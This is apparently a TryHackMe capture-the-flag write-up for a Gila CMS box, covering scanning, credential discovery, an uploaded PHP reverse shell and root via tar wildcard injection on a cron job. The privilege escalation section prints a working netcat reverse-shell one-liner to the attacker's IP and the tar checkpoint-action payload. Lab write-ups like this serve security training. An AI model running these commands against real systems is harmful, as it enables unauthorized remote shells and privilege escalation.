
[TryHackMe Link](https://tryhackme.com/room/cmess){ .md-button }

!!! example "Description"

    <p id="desc" style="font-size:15px"></p>

## <b>Scanning</b>

* Assigned IP address: &nbsp; <b id="ip" style="color:purple"></b>
  
* Open Ports: 

| <p style="font-size:14px; color: black">PORT</p>      | <p style="font-size:14px; color: black">SERVICE</p> |  <p style="font-size:14px; color: black">DESCRIPTION                          |
| :---------: | :---------: | :----------------------------------: |
| <p id="p1" style="font-size:14px; color: purple"></p>      | <p id="s1" style="font-size:14px; color: purple"></p>  |<p id="d1" style="font-size:14px; color: purple"></p>   |
| <p id="p2" style="font-size:14px;  color: purple"></p>     | <p id="s2" style="font-size:14px; color: purple"></p>  |<p id="d2" style="font-size:14px; color: purple"></p> |


* Nmap Report:
  ```s linenums="1" hl_lines="6 11"
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-05 13:51 EST
    Nmap scan report for 10.10.254.242
    Host is up (0.35s latency).
    Not shown: 998 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 d9b652d3939a3850b4233bfd210c051f (RSA)
    |   256 21c36e318b85228a6d72868fae64662b (ECDSA)
    |_  256 5bb9757805d7ec43309617ffc6a86ced (ED25519)
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
    |_http-generator: Gila CMS
    | http-robots.txt: 3 disallowed entries 
    |_/src/ /themes/ /lib/
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.93%E=4%D=1/5%OT=22%CT=1%CU=33367%PV=Y%DS=5%DC=I%G=Y%TM=65984FFA
    OS:%P=aarch64-unknown-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=
    OS:8)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%TS=8)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%II=I%
    OS:TS=8)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5
    OS:=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=
    OS:68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
    OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
    OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
    OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
    OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
    OS:%T=40%CD=S)

    Network Distance: 5 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 45.96 seconds

  ```

## <b>Enumeration</b>

At Port 80, following website was hosted with Gila CMS. 

<img id="image1" />

The site was running an older version, exposing some vulnerabilities that were present in searchsploit as shown below. 

<img id="image2" />

As suggested by website, I added 

```s
10.10.254.242 cmess.thm
```

to the **/etc/hosts** file. I was highly anticipating additional subdomains or Vhosts within the directory. Later, I discovered the **dev.cmess.thm** domain. This particular webpage revealed sensitive credentials for a user named `Andre`.

<img id="image3" />

## <b>Initial Access</b>

Initially attempting SSH access with the given credentials were unsuccessful. So, I thought the credentials might apply to the CMS login page, and indeed, they did. Accessing the admin dashboard at `http://cmess.thm/admin`, I attempted to inject a reverse shell through the `rev.png` file (since, image assets file were available), but it failed to parse correctly. 

<img id="image4" />

So, I placed a typical reverse-shell.php file in **content -> filemanger -> assets** folder, successfully gaining the initial foothold.

```
http://cmess.thm/assets/reverse-shell.php
``` 

<img id="image5" />

Quickly, I netcated (I mean, if there is a word like that :P) the `linpeas.sh` script, to identify potential leads. Surprisngly, a cron job was running every 2 minutes and a password backup file for andre were discovered. 

<img id="image7" />

```
www-data@cmess:/tmp$ cat /opt/.password.bak
andres backup password
{--UQREDACTED6--}
www-data@cmess:/tmp$
```

The backup file contained the SSH password for Andre, and this time, the login succeeded.

<img id="image8" />

## <b>Privilege Escalation</b>

I saw a note on backups folder in /home/andre.

```
andre@cmess:~$ cat backup/note 
Note to self.
Anything in here will be backed up!
```

Recalling the earlier enumeration of a cron job executing the **tar** command, I explored the possibility of utilising a tar wildcard injection attack. 

<img id="image6" />

!!! info "TAR wilcard injection"
    <span>It is a security vulnerability where an attacker manipulates a tar command's user-input, exploiting wildcards to include unintended files and potentially leading to unauthorized access or code execution.
    Read more at: <a href="https://medium.com/@cybenfolland/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa" target="_blank">Linux Privilege Escalation: Wildcards with tar</a></span>

This led me to execute my reverse shell from **rev.sh** in the same folder. 

!!! warning "Reverse shell Payload"
    ```sh
    echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.17.3.217 5432 >/tmp/f" > rev.sh
    ```

!!! danger "TAR wilcard Injection"
    ```sh
    echo "" > '--checkpoint=1'
    echo "" > '--checkpoint-action=exec=sh rev.sh'  
    ```

After waiting for 2 minutes, I got shell and located the root flag and its password hash.

<img id="image9" />



<script>

// JSON object
const data = {
    "desc": "Can you root this Gila CMS box?",
    "ip":  "10.10.254.242",
    "ports": "22/tcp,open,OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux protocol 2.0);80/tcp,open,Apache httpd 2.4.18 ((Ubuntu))",
    "difficulty":"medium",
    "id": "6"
}


function updateHTML() {

    const keys = Object.keys(data);
    const values = Object.values(data);

    for(var z=0; z < keys.length; z++){

        if(keys[z] === "ports"){
            const ports = data.ports.split(';');
            for(var i = 0; i < ports.length; i++){
                document.getElementById("p"+(i+1)).innerHTML = ports[i].split(',')[0].toUpperCase();
                document.getElementById("s"+(i+1)).innerHTML = ports[i].split(',')[1].toUpperCase();
                document.getElementById("d"+(i+1)).innerHTML = ports[i].split(',')[2];
            }
        }
        else{
            try{
            document.getElementById(keys[z]).innerHTML = values[z];
            }
            catch(error){
                console.log(values[z]);
            }
        }
    }

    // replace the values with your specific filenames and number of images and img tags
    const numImgTags = document.getElementsByTagName('img').length;

    for (let i = 1; i <= numImgTags; i++) {
    const imgTag = document.getElementById('image' + i);
        if (imgTag) {
            imgTag.src = '../images/'+data.difficulty[0]+data.id+'-image' + i + '.png';
        }
    }


}

updateHTML();
</script>